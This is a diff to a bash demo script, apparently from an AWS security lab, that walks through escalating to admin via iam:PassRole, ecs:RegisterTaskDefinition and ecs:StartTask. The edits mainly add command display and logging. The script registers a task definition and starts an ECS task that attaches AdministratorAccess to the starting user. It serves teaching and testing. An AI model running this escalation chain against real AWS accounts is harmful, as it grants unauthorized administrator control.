@@ -3,7 +3,9 @@
 # Demo script for iam:PassRole + ecs:RegisterTaskDefinition + ecs:StartTask privilege escalation
 # This scenario demonstrates how a user with PassRole, RegisterTaskDefinition, and StartTask can escalate to admin
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -11,6 +13,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-ecs-005-to-admin-starting-user"
@@ -72,6 +92,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -83,6 +104,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID and container instance ARN
 echo -e "${YELLOW}Step 3: Getting account ID and container instance ARN${NC}"
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 
@@ -106,6 +128,7 @@ echo -e "${GREEN}✓ Retrieved account ID and container instance ARN${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -162,6 +185,7 @@ EOF
 )
 
 echo "Registering task definition..."
+show_attack_cmd "aws ecs register-task-definition --region $AWS_REGION --cli-input-json \"...\""
 TASK_DEF_RESULT=$(aws ecs register-task-definition \
     --region $AWS_REGION \
     --cli-input-json "$TASK_DEFINITION" \
@@ -187,6 +211,7 @@ echo "Container Instance: $CONTAINER_INSTANCE_ARN"
 echo "This task will attach AdministratorAccess policy to: $STARTING_USER"
 echo ""
 
+show_attack_cmd "aws ecs start-task --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --task-definition \"$TASK_DEFINITION_FAMILY:$TASK_DEF_REVISION\" --container-instances $CONTAINER_INSTANCE_ARN"
 START_TASK_RESULT=$(aws ecs start-task \
     --region $AWS_REGION \
     --cluster $ECS_CLUSTER_NAME \
@@ -216,6 +241,7 @@ while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
     ATTEMPT=$((ATTEMPT + 1))
 
     # Get task status
+    show_cmd "aws ecs describe-tasks --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --tasks $TASK_ARN --output json"
     TASK_INFO=$(aws ecs describe-tasks \
         --region $AWS_REGION \
         --cluster $ECS_CLUSTER_NAME \
@@ -290,6 +316,7 @@ echo ""
 echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
+show_cmd "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -317,6 +344,13 @@ echo "  $STARTING_USER → (PassRole + RegisterTaskDefinition + StartTask)"
 echo "  → ECS Task with $ADMIN_ROLE → AttachUserPolicy"
 echo "  → $STARTING_USER gains AdministratorAccess → Admin"
 
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
+
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- ECS Task Definition: $TASK_DEFINITION_FAMILY (revision $TASK_DEF_REVISION)"
 echo "- ECS Cluster: $ECS_CLUSTER_NAME"
@@ -329,3 +363,6 @@ echo ""
 echo -e "${YELLOW}To clean up and restore the original state:${NC}"
 echo "  ./cleanup_attack.sh"
 echo ""
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
